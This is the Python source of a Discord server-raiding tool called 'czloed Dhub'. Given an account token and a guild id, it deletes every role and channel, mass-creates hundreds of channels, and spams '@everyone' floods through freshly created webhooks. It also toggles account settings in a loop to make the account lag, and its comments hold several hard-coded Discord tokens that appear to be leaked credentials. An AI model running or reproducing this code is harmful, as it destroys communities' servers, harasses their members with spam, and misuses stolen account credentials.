from requests import get,post,patch,delete
from websocket import WebSocket

from time import sleep
from json import load,loads,dumps
from sty import fg
from os import system,environ
from random import randint,randrange

from concurrent.futures import ThreadPoolExecutor

def livestream(token,guild,ch) :
    ws = WebSocket()
    ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
    heartbeat_interval = loads(ws.recv())['d']['heartbeat_interval']
    ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
    ws.send(dumps({"op": 4,"d": {"guild_id": guild,"channel_id": ch,"self_mute": True,"self_deaf": True}}))
    ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": guild,"channel_id": ch,"preferred_region": "singapore"}}))
    while run:
        sleep(heartbeat_interval/1000)
        try:
            ws.send(dumps({"op": 1,"d": None}))
        except:
            break

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        asc += chr(randrange(13000))
    return asc
    
def wh_spam(webhook):
    global run
    while run:
        st = post(webhook, json={"content": f"@everyone {asciigen(1988)}"}).status_code
        if st != 204:
            delete(webhook)
            break
        else:
            try:
                ratelimit = st['retry_after']
                timetowait = ratelimit / 1000
                sleep(timetowait)
            except:
                break
            
def wh_create(ch):
    def a():
        wh_info = post(f"https://discord.com/api/v9/channels/{ch}/webhooks",json={"name":"czloed Dhub"},headers=headers).json()
        wh_url = f"https://discord.com/api/webhooks/{wh_info['id']}/{wh_info['token']}"
        for _ in range(2):
            executor.submit(wh_spam,wh_url)
    for _ in range(10):
        executor.submit(a)

def role_del(guild,r):
    delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}", headers=headers)

def get_all_roles(guild):
    r = []
    for r_ in get(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers).json():
        if r_['name'] != "@everyone":
            r.append(r_['id'])
    return r

def ch_create(guild,type,name):
    # {"type":0,"name":"1","permission_overwrites":[],"parent_id":"871355504591536158"} ch
    # {"type":2,"name":"1","permission_overwrites":[]} voice
    chid = post(f"https://discord.com/api/v9/guilds/{guild}/channels",json={"type":type,"name":name,"permission_overwrites":[]},headers=headers).json()['id']
    executor.submit(wh_create,chid)
    
def ch_del(ch):
    delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers)

def get_all_ch(guild):
    ch = {"text":[],"voice":[]}
    for ch_ in get(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers).json():
        if ch_['type'] == 0:
            ch["text"].append(ch_["id"])
        elif ch_['type'] == 2:
            ch["voice"].append(ch_["id"])
    return ch

def get_all_users(guild):
    u = []
    ws.send(dumps({"op": 8,"d": {"guild_id": guild,"query": "","limit": 0}}))
    return u

def info():
    acc_info = get("https://discord.com/api/v9/users/@me", headers=headers).json()
    acc_lock = get("https://discord.com/api/v9/users/@me/library", headers=headers).status_code
    return {"info":acc_info, "lock":True if acc_lock == 403 else False}

def lag():
    global run
    def a():
        while run:
            patch("https://discord.com/api/v9/users/@me/settings",json={"theme":"light"},headers=headers)
            sleep(1)
            patch("https://discord.com/api/v9/users/@me/settings",json={"theme":"dark"},headers=headers)
            sleep(1)
    def b():
        while run:
            for v in ["zh-TW","zh-CN","ja","es-ES","fi","el","hi","ru","tr"] :
                patch("https://discord.com/api/v9/users/@me/settings",json={"locale":v},headers=headers)
                sleep(1)
    def c():
        while run:
            for vv in [True,False] :
                patch("https://discord.com/api/v9/users/@me/settings",json={"message_display_compact":vv},headers=headers)
                sleep(1)
    executor.submit(a)
    executor.submit(b)
    executor.submit(c)
   
def connect():
    ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
    heartbeat_interval = loads(ws.recv())['d']['heartbeat_interval']
    while True:
        sleep(heartbeat_interval/1000)
        try:
            ws.send(dumps({"op": 1,"d": None}))
        except:
            break
def cls():
    system("cls")
    logo()
def title():
    system(f"title {base_title.replace('|','^|')}")
def logo():
    print(f"""{fg(randint(203,231))}
 ██████╗███████╗██╗      ██████╗ ███████╗██████╗     ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
██╔════╝╚══███╔╝██║     ██╔═══██╗██╔════╝██╔══██╗    ██╔══██╗██║  ██║██║   ██║██╔══██╗
██║       ███╔╝ ██║     ██║   ██║█████╗  ██║  ██║    ██║  ██║███████║██║   ██║██████╔╝
██║      ███╔╝  ██║     ██║   ██║██╔══╝  ██║  ██║    ██║  ██║██╔══██║██║   ██║██╔══██╗
╚██████╗███████╗███████╗╚██████╔╝███████╗██████╔╝    ██████╔╝██║  ██║╚██████╔╝██████╔╝
 ╚═════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                                                                    {fg(randint(203,231))}By larinax999  {fg.rs}""")
def inputc(text):
    return input(f"{text} > ")
    
def start():
    global headers,token,base_title
    token = inputc("token")#"ODcyNDk3OTc0NDMxODYyODU0.YQrQGA.Zw4Wop9uTCX51SfDxtAAtaRf6gc"#"mfa.oiEymxpBBIA4ZL9mhgnMSUVyoeDr_eNilNve6ABTCkP7U52XTu6YqRFQQPlErY2t6-YsEvAHFvuRKwiZRZpe"#"ODc1MDIzMzE4MzEzNDkyNTIw.YRPfHA.pg4KFQ6IVrsWIIOJ5E6z4qqUl4I"
    headers = {'Accept': '*/*','Accept-Language': 'en-US','Content-Type': 'application/json','user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.7 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36', 'authorization': token}   
    
    
    print(f"login token as [{token}]")
    acc = info()
    if not token.startswith("Bot"):
        if acc['lock'] == True:
            return print("phone locked")
    base_title += f"| {acc['info']['username']}#{acc['info']['discriminator']} "
    title()
    cls()
    while True:
        op = input(" > ").lower()
        if op == "help":
                print("""  > auto | auto mode is ez to raid discord [test]
  > stop | stop everythings [fix]
  > connectws | connect websocket for get all uesrs (ban, kick)
  > disconnectws | disconnect websocket
  =====================================================
  > lag | make token lag and crash
  > webhook | webhook spammer
  > floodch | spam create text or voice channels
  =====================================================
  > ban | ban all users [not yet]
  > kick | kick all users [not yet]
  > delrole | delete all roles
  > delch | delete all channel(s)""")
        elif op == "clear":
            cls()
            logo()
        elif op == "exit":
            exit("Bye")
        elif op == "stop":
            run = False
        elif op == "auto":
            guild=inputc("guild id")
            # delete roles
            print("[auto] delete roles")
            for r in get_all_roles(guild):
                executor.submit(role_del,guild,r)
                
            # delete all channels
            print("[auto] delete all channels")
            ch=get_all_ch(guild)
            for chid in ch["text"]:
                executor.submit(ch_del,chid)
            for chid in ch["voice"]:
                executor.submit(ch_del,chid)
                
            # spam create
            print("[auto] flood channels and webhook spam")
            for _ in range(499):
                executor.submit(ch_create,guild,0,"czloed Dhub")
                
            print("[auto] All Done")
        elif op == "floodch":
            guild=inputc("guild id")
            name=inputc("name channel")
            type=inputc("type [text = 0, voice = 2]")
            am=inputc("amount")
            for _ in range(int(am)):
                executor.submit(ch_create,guild,type,name)
            cls()
        elif op == "webhook":
            guild=inputc("guild id")
            ch=get_all_ch(guild)
            for chid in ch["text"]:
                executor.submit(wh_create,chid)
            cls()
        elif op == "delch":
            guild=inputc("guild id")
            ch=get_all_ch(guild)
            for chid in ch["text"]:
                executor.submit(ch_del,chid)
            for chid in ch["voice"]:
                executor.submit(ch_del,chid)
            cls()
        elif op == "delrole":
            guild=inputc("guild id")
            for r in get_all_roles(guild):
                executor.submit(role_del,guild,r)
            cls()
        elif op == "ban":
            guild=inputc("guild id")
            for r in get_all_users(guild):
                executor.submit(user_ban,guild,r)
            cls()
        elif op == "kick":
            guild=inputc("guild id")
            for r in get_all_users(guild):
                executor.submit(user_kick,guild,r)
            cls()
        elif op == "lag":
            lag()
            print("Ok")
        elif op == "disconnectws":
            try :
                ws.close()
                print("[ws] disconnected")
            except:
                print("[ws] not connected")
        elif op == "connectws":
            try :
                executor.submit(connect)
                print("[ws] connected to discord server")
            except:
                print("[ws] not connected")
        else :
            print(f"type {fg(randint(200,231))}help{fg.rs} to show commands")

if __name__ == "__main__":
    system("")
    config = load(open('config.json', encoding="utf8"))
    executor = ThreadPoolExecutor(max_workers=int(1000000))
    headers=""
    token=""
    run=True
    ws=WebSocket()
    base_title = f"czloed Dhub | {environ['USERNAME']} "
    title()
    cls()
    start()
    
